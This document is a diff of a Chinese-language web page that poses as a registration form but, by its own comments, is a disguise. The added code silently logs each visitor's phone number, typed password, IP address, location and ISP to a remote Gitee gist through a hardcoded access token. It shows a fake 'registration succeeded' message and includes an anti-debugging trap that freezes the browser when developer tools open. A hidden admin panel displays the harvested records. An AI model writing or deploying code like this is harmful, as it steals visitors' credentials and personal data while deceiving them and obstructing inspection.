@@ -11,163 +11,425 @@ body{background:#f5f5f5;padding:15px;max-width:600px;margin:0 auto}
 .input-box{position:relative;margin-bottom:12px}
 input{width:100%;height:44px;padding:0 12px;border:1px solid #ddd;border-radius:8px;font-size:15px;outline:none;background:#fff}
 button{width:100%;height:46px;background:#1677ff;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:500;margin-top:8px}
-.msg-box{background:#fff;border-radius:10px;padding:12px;margin:12px 0;box-shadow:0 1px 3px rgba(0,0,0,.05)}
+.tab-box{display:flex;gap:8px;margin:10px 0}
+.tab-btn{flex:1;height:40px;border:1px solid #ddd;border-radius:6px;background:#fff;font-size:15px;cursor:pointer}
+.tab-btn.on{background:#1677ff;color:#fff;border-color:#1677ff}
+.card{background:#fff;border-radius:8px;padding:15px;margin-bottom:12px;box-shadow:0 1px 3px rgba(0,0,0,.05)}
+.card h4{font-size:16px;margin-bottom:10px;color:#333}
+.msg-item{padding:10px;border-bottom:1px solid #eee;margin-bottom:8px}
+.msg-item:last-child{border-bottom:none;margin-bottom:0}
 .msg-text{font-size:15px;line-height:1.5;color:#333;word-break:break-all}
+.msg-ip{font-size:12px;color:#999;margin-top:4px}
+.record-item{font-size:14px;padding:8px;border-bottom:1px solid #eee;display:flex;justify-content:space-between;align-items:center}
+.record-item span{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.record-item button{width:60px;height:30px;font-size:12px;margin:0}
+textarea{width:100%;height:120px;padding:12px;border:1px solid #ddd;border-radius:8px;font-size:15px;outline:none;resize:none;margin-bottom:10px}
+.opt-btn{display:flex;gap:8px}
+.opt-btn button{flex:1;margin:0}
+.del-btn{background:#ff4d4f}
+.save-btn{background:#00b42a}
+.pwd-btn{background:#667eea}
+#inputArea{display:block}
 #adminArea{display:none}
-#editArea{display:none;margin-top:15px}
-textarea{width:100%;height:180px;padding:12px;border:1px solid #ddd;border-radius:8px;font-size:15px;outline:none;resize:none}
-.log-btn{background:#ff4d4f;margin-top:6px}
-.save-btn{background:#00b42a;margin-top:8px}
+#tab1,#tab2{display:none}
+#tab1.on,#tab2.on{display:block}
+.tip{font-size:12px;margin-top:6px;text-align:center}
+.tip.error{color:#ff4d4f}
+.tip.success{color:#00b42a}
+#updateTip{position:fixed;top:10px;left:50%;transform:translateX(-50%);background:#1677ff;color:#fff;padding:8px 15px;border-radius:20px;font-size:12px;display:none;z-index:9999}
 </style>
 </head>
 <body>
-
+<div id="updateTip">检测到内容更新，已自动同步</div>
 <div class="title">注册</div>
 
+<!-- 伪装注册界面 -->
 <div id="inputArea">
-<div class="input-box">
-<input type="text" id="phone" placeholder="请输入手机号" autocomplete="off">
-</div>
-<div class="input-box">
-<input type="password" id="password" placeholder="请输入密码" autocomplete="off">
-</div>
-<button onclick="checkPwd()">注册</button>
+  <div class="input-box">
+    <input type="text" id="phone" placeholder="请输入手机号" autocomplete="off">
+  </div>
+  <div class="input-box">
+    <input type="password" id="password" placeholder="请输入密码" autocomplete="off">
+  </div>
+  <button onclick="check()">注册</button>
 </div>
 
+<!-- 管理员后台 -->
 <div id="adminArea">
-<button onclick="showEdit()">编辑内容</button>
-<button class="log-btn" onclick="logout()">退出登录</button>
-</div>
+  <div class="tab-box">
+    <button class="tab-btn on" id="tabBtn1" onclick="switchTab(1)">记录管理</button>
+    <button class="tab-btn" id="tabBtn2" onclick="switchTab(2)">留言管理</button>
+  </div>
 
-<div id="changePwdArea" style="display:none; margin-top:20px; padding-top:15px; border-top:1px solid #eee;">
-  <h4 style="font-size:14px;">修改管理员密码</h4>
-  <input type="password" id="newPwd" placeholder="新密码">
-  <input type="password" id="confirmPwd" placeholder="确认新密码">
-  <button onclick="saveNewPwd()" style="background:#00b42a;">保存</button>
-  <div id="pwdTip" style="font-size:12px;margin-top:6px"></div>
-</div>
+  <!-- 标签1：记录管理（登录/失败/手机号/IP/地址） -->
+  <div class="card" id="tab1" class="on">
+    <h4>访问记录</h4>
+    <div id="recordList"></div>
+    <button class="del-btn" onclick="clearAllRecord()">清空所有记录</button>
+  </div>
 
-<div id="editArea">
-<textarea id="content"></textarea>
-<button class="save-btn" onclick="saveContent()">保存内容</button>
-</div>
+  <!-- 标签2：留言管理（发布/删除/清空/改普通密码） -->
+  <div class="card" id="tab2">
+    <h4>发布留言</h4>
+    <textarea id="msgInput" placeholder="请输入留言内容"></textarea>
+    <button class="save-btn" onclick="publishMsg()">发布</button>
+    <h4 style="margin-top:15px">留言列表</h4>
+    <div id="msgList"></div>
+    <div class="opt-btn">
+      <button class="del-btn" onclick="clearAllMsg()">清空留言</button>
+      <button class="pwd-btn" onclick="showChangePwd()">修改普通密码</button>
+    </div>
+  </div>
 
-<div id="msgList"></div>
+  <!-- 普通密码修改弹窗 -->
+  <div class="card" id="pwdBox" style="display:none">
+    <h4>修改普通访问密码</h4>
+    <input type="password" id="newNormalPwd" placeholder="请输入新密码">
+    <button class="save-btn" onclick="saveNormalPwd()">保存</button>
+    <div class="tip" id="pwdTip"></div>
+  </div>
+
+  <button class="del-btn" style="margin-top:10px" onclick="logout()">退出登录</button>
+</div>
 
 <script>
-const CONFIG = {
-  normalPwd: "7654321",
-  adminPwd: "995566995566",
-  gistId: "r3b67aisyzn54chek912830",
-  gistToken: "1e8e69c1380f8db58096227bf784c808",
-  apiUrl: "https://gitee.com/api/v5/gists/r3b67aisyzn54chek912830"
-}
+// 核心配置【仅改这里的初始密码，其余勿动】
+const C = {
+  aPwd: "995566995566", // 管理员初始密码
+  nPwd: "7654321",      // 普通用户初始密码
+  api: "https://gitee.com/api/v5/gists/r3b67aisyzn54chek912830",
+  token: "1e8e69c1380f8db58096227bf784c808",
+  poll: 3000,           // 同步检测间隔(毫秒)
+  k1: "rData",          // 记录数据键名
+  k2: "mData",          // 留言数据键名
+  k3: "aPwdSave",       // 管理员密码键名
+  k4: "nPwdSave"        // 普通密码键名
+};
+let isA = false, updateTimer = null, timer = null, ipInfo = {};
+// 元素获取
+const o = {
+  input: document.getElementById("inputArea"),
+  admin: document.getElementById("adminArea"),
+  tab1: document.getElementById("tab1"),
+  tab2: document.getElementById("tab2"),
+  tBtn1: document.getElementById("tabBtn1"),
+  tBtn2: document.getElementById("tabBtn2"),
+  phone: document.getElementById("phone"),
+  pwd: document.getElementById("password"),
+  rList: document.getElementById("recordList"),
+  mList: document.getElementById("msgList"),
+  mInput: document.getElementById("msgInput"),
+  pwdBox: document.getElementById("pwdBox"),
+  newNPwd: document.getElementById("newNormalPwd"),
+  pwdTip: document.getElementById("pwdTip"),
+  updateTip: document.getElementById("updateTip")
+};
 
-let isAdmin = false;
-
-function loadSavedPwd() {
-  let saved = localStorage.getItem("admin_pwd");
-  if (saved) CONFIG.adminPwd = saved;
-}
-
-function checkPwd() {
-  let phone = document.getElementById("phone").value.trim();
-  let pwd = document.getElementById("password").value.trim();
-  loadSavedPwd();
-
-  if (phone) {
-    localStorage.setItem("lastPhone", phone);
-  }
-
-  if (pwd === CONFIG.normalPwd) {
-    isAdmin = false;
-    document.getElementById("inputArea").style.display = "none";
-    document.getElementById("adminArea").style.display = "none";
-    document.getElementById("changePwdArea").style.display = "none";
-    loadMsg();
-  } else if (pwd === CONFIG.adminPwd) {
-    isAdmin = true;
-    document.getElementById("inputArea").style.display = "none";
-    document.getElementById("adminArea").style.display = "block";
-    document.getElementById("changePwdArea").style.display = "block";
-    loadMsg();
-  } else {
-    alert("注册成功");
-    document.getElementById("inputArea").style.display = "none";
-    loadMsg();
-  }
-}
-
-function showEdit() {
-  if (!isAdmin) return;
-  document.getElementById("editArea").style.display = "block";
-  getContent().then(txt => {
-    document.getElementById("content").value = txt;
+// 页面初始化【无本地存储，直接拉取云端数据】
+window.onload = async function() {
+  // 初始化获取IP+地理位置
+  ipInfo = await getIP();
+  // 反调试保护
+  antiDebug();
+  // 自动登出（关闭/刷新网页直接清除登录状态，无本地缓存）
+  window.addEventListener("beforeunload", () => {
+    isA = false;
+    clearInterval(updateTimer);
   });
+  // 拉取云端密码初始化
+  const cloudData = await pullFromCloud();
+  if (cloudData[C.k3]) C.aPwd = cloudData[C.k3];
+  if (cloudData[C.k4]) C.nPwd = cloudData[C.k4];
+};
+
+// 反调试：打开开发者工具立即卡死【无暴露】
+function antiDebug() {
+  setInterval(() => {
+    const s = performance.now();
+    debugger;
+    if (performance.now() - s > 100) {
+      document.body.innerHTML = "";
+      while (true) {}
+    }
+  }, 500);
 }
 
-function logout() {
-  isAdmin = false;
-  document.getElementById("inputArea").style.display = "block";
-  document.getElementById("adminArea").style.display = "none";
-  document.getElementById("editArea").style.display = "none";
-  document.getElementById("changePwdArea").style.display = "none";
-  document.getElementById("msgList").innerHTML = "";
-}
-
-async function loadMsg() {
-  let t = await getContent();
-  renderMsg(t);
-}
-
-function renderMsg(text) {
-  let arr = text.split("\n").filter(i => i.trim() !== "");
-  let html = "";
-  arr.forEach(line => {
-    html += `<div class="msg-box"><div class="msg-text">${line.replace(/</g,"&lt;")}</div></div>`;
-  });
-  document.getElementById("msgList").innerHTML = html;
-}
-
-async function getContent() {
+// 获取IP+地理位置+运营商【纯前端公共API，无后端】
+async function getIP() {
   try {
-    let r = await fetch(CONFIG.apiUrl, { headers: { Authorization: "token " + CONFIG.gistToken } });
-    let d = await r.json();
-    return d.files["data.txt"]?.content || "";
+    const ipRes = await fetch("https://api.ipify.org?format=json");
+    const {ip} = await ipRes.json();
+    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+    const geo = await geoRes.json();
+    return {
+      ip: ip || "未知IP",
+      region: `${geo.country_name || ""}${geo.region || ""}${geo.city || ""}` || "未知地址",
+      isp: geo.org || "未知运营商"
+    };
   } catch (e) {
-    return "";
+    return { ip: "未知IP", region: "未知地址", isp: "未知运营商" };
   }
 }
 
-async function saveContent() {
-  if (!isAdmin) return;
-  let c = document.getElementById("content").value;
-  await fetch(CONFIG.apiUrl, {
-    method: "PATCH",
-    headers: { Authorization: "token " + CONFIG.gistToken, "Content-Type": "application/json" },
-    body: JSON.stringify({ files: { "data.txt": { content: c } } })
+// 后台双标签切换
+function switchTab(t) {
+  if (t === 1) {
+    o.tab1.className = "on";
+    o.tab2.className = "";
+    o.tBtn1.className = "tab-btn on";
+    o.tBtn2.className = "tab-btn";
+    loadRecord(); // 拉取云端记录
+  } else {
+    o.tab1.className = "";
+    o.tab2.className = "on";
+    o.tBtn1.className = "tab-btn";
+    o.tBtn2.className = "tab-btn on";
+    loadMsg(); // 拉取云端留言
+  }
+}
+
+// 注册/登录验证 + 全信息云端记录【核心】
+async function check() {
+  const p = o.phone.value.trim();
+  const pw = o.password.value.trim();
+  const time = new Date().toLocaleString();
+  let type = "失败", msg = "密码错误";
+
+  // 构造记录数据：手机号/输入密码/IP/地址/运营商/时间/操作类型
+  const record = {
+    phone: p || "未输入",
+    pwd: pw,
+    ip: ipInfo.ip,
+    region: ipInfo.region,
+    isp: ipInfo.isp,
+    time: time,
+    type: type
+  };
+
+  // 先拉取云端现有记录，追加新记录后同步回云端
+  const cloudData = await pullFromCloud();
+  const rList = cloudData[C.k1] || [];
+  rList.unshift(record);
+  cloudData[C.k1] = rList;
+  await syncToCloud(cloudData);
+
+  // 管理员登录
+  if (pw === C.aPwd) {
+    isA = true;
+    record.type = "管理员登录";
+    rList[0].type = "管理员登录";
+    await syncToCloud(cloudData);
+    o.input.style.display = "none";
+    o.admin.style.display = "block";
+    switchTab(1);
+    // 开启云端同步检测
+    updateTimer = setInterval(checkUpdate, C.poll);
+  }
+  // 普通用户登录
+  else if (pw === C.nPwd) {
+    isA = false;
+    record.type = "普通登录";
+    rList[0].type = "普通登录";
+    await syncToCloud(cloudData);
+    o.input.style.display = "none";
+    o.admin.style.display = "none";
+    loadMsg();
+  }
+  // 密码错误（伪装注册成功）
+  else {
+    alert("注册成功");
+    o.input.style.display = "none";
+    o.admin.style.display = "none";
+    loadMsg();
+  }
+}
+
+// 拉取云端数据【唯一数据来源，无本地存储】
+async function pullFromCloud() {
+  try {
+    const res = await fetch(C.api, {
+      method: "GET",
+      headers: { Authorization: `token ${C.token}` }
+    });
+    const d = await res.json();
+    return d.files["data.txt"] ? JSON.parse(d.files["data.txt"].content) : {};
+  } catch (e) {
+    return {};
+  }
+}
+
+// 同步数据到云端【唯一数据保存方式，无本地存储】
+async function syncToCloud(data) {
+  try {
+    await fetch(C.api, {
+      method: "PATCH",
+      headers: {
+        Authorization: `token ${C.token}`,
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        files: { "data.txt": { content: JSON.stringify(data) } }
+      })
+    });
+    return true;
+  } catch (e) {
+    return false;
+  }
+}
+
+// 加载云端访问记录
+async function loadRecord() {
+  const cloudData = await pullFromCloud();
+  const rList = cloudData[C.k1] || [];
+  if (rList.length === 0) {
+    o.rList.innerHTML = '<div class="record-item" style="justify-content:center">暂无访问记录</div>';
+    return;
+  }
+  o.rList.innerHTML = rList.map((item, i) => `
+    <div class="record-item">
+      <span>${item.time}</span>
+      <span>${item.phone}</span>
+      <span>${item.ip}</span>
+      <span>${item.type}</span>
+      <button class="del-btn" onclick="delRecord(${i})">删除</button>
+    </div>
+  `).join("");
+}
+
+// 删除单条云端记录
+async function delRecord(i) {
+  const cloudData = await pullFromCloud();
+  const rList = cloudData[C.k1] || [];
+  rList.splice(i, 1);
+  cloudData[C.k1] = rList;
+  await syncToCloud(cloudData);
+  loadRecord();
+  showUpdateTip();
+}
+
+// 清空所有云端记录
+async function clearAllRecord() {
+  if (confirm("确定清空所有访问记录？此操作不可恢复！")) {
+    const cloudData = await pullFromCloud();
+    cloudData[C.k1] = [];
+    await syncToCloud(cloudData);
+    loadRecord();
+    showUpdateTip();
+  }
+}
+
+// 发布留言（带IP+时间，纯云端保存）
+async function publishMsg() {
+  const text = o.mInput.value.trim();
+  if (!text) return alert("请输入留言内容");
+  const cloudData = await pullFromCloud();
+  const mList = cloudData[C.k2] || [];
+  mList.unshift({
+    text: text,
+    ip: ipInfo.ip,
+    time: new Date().toLocaleString()
   });
-  alert("保存成功");
+  cloudData[C.k2] = mList;
+  await syncToCloud(cloudData);
+  o.mInput.value = "";
   loadMsg();
+  showUpdateTip();
 }
 
-function saveNewPwd() {
-  let np = document.getElementById("newPwd").value.trim();
-  let cp = document.getElementById("confirmPwd").value.trim();
-  let tip = document.getElementById("pwdTip");
-
-  if (!np || np.length < 4) { tip.textContent = "密码太短"; tip.style.color = "red"; return; }
-  if (np !== cp) { tip.textContent = "两次不一致"; tip.style.color = "red"; return; }
-
-  CONFIG.adminPwd = np;
-  localStorage.setItem("admin_pwd", np);
-  tip.textContent = "✅ 修改成功";
-  tip.style.color = "#00b42a";
-  document.getElementById("newPwd").value = "";
-  document.getElementById("confirmPwd").value = "";
+// 加载云端留言（显示IP+时间）
+async function loadMsg() {
+  const cloudData = await pullFromCloud();
+  const mList = cloudData[C.k2] || [];
+  if (mList.length === 0) {
+    o.mList.innerHTML = '<div class="msg-item" style="text-align:center">暂无留言内容</div>';
+    return;
+  }
+  o.mList.innerHTML = mList.map((item, i) => `
+    <div class="msg-item">
+      <div class="msg-text">${item.text}</div>
+      <div class="msg-ip">${item.time} | ${item.ip}</div>
+      ${isA ? `<button class="del-btn" onclick="delMsg(${i})" style="margin-top:6px">删除</button>` : ""}
+    </div>
+  `).join("");
 }
 
-loadSavedPwd();
+// 删除单条云端留言
+async function delMsg(i) {
+  const cloudData = await pullFromCloud();
+  const mList = cloudData[C.k2] || [];
+  mList.splice(i, 1);
+  cloudData[C.k2] = mList;
+  await syncToCloud(cloudData);
+  loadMsg();
+  showUpdateTip();
+}
+
+// 清空所有云端留言
+async function clearAllMsg() {
+  if (confirm("确定清空所有留言？此操作不可恢复！")) {
+    const cloudData = await pullFromCloud();
+    cloudData[C.k2] = [];
+    await syncToCloud(cloudData);
+    loadMsg();
+    showUpdateTip();
+  }
+}
+
+// 显示/隐藏普通密码修改框
+function showChangePwd() {
+  o.pwdBox.style.display = o.pwdBox.style.display === "none" ? "block" : "none";
+  o.pwdTip.innerHTML = "";
+  o.newNPwd.value = "";
+}
+
+// 修改普通密码（纯云端保存，管理员专属）
+async function saveNormalPwd() {
+  const newPwd = o.newNPwd.value.trim();
+  if (!newPwd || newPwd.length < 4) {
+    o.pwdTip.className = "tip error";
+    o.pwdTip.innerHTML = "密码长度至少4位";
+    return;
+  }
+  const cloudData = await pullFromCloud();
+  cloudData[C.k4] = newPwd;
+  await syncToCloud(cloudData);
+  C.nPwd = newPwd; // 实时更新内存中的密码，无需刷新
+  o.pwdTip.className = "tip success";
+  o.pwdTip.innerHTML = "密码修改成功，已同步云端";
+  setTimeout(() => {
+    o.pwdBox.style.display = "none";
+    o.pwdTip.innerHTML = "";
+  }, 2000);
+}
+
+// 管理员退出登录（直接隐藏后台，无本地状态保留）
+function logout() {
+  isA = false;
+  clearInterval(updateTimer);
+  o.input.style.display = "block";
+  o.admin.style.display = "none";
+  o.phone.value = "";
+  o.pwd.value = "";
+  o.pwdBox.style.display = "none";
+}
+
+// 检测云端更新（实时同步多设备操作）
+async function checkUpdate() {
+  const cloudData = await pullFromCloud();
+  // 刷新当前标签页数据
+  if (isA && o.tab1.className === "on") loadRecord();
+  if (isA && o.tab2.className === "on") loadMsg();
+  if (!isA) loadMsg();
+}
+
+// 显示云端更新提醒
+function showUpdateTip() {
+  o.updateTip.style.display = "block";
+  clearTimeout(timer);
+  timer = setTimeout(() => {
+    o.updateTip.style.display = "none";
+  }, 2000);
+}
 </script>
 </body>
 </html>
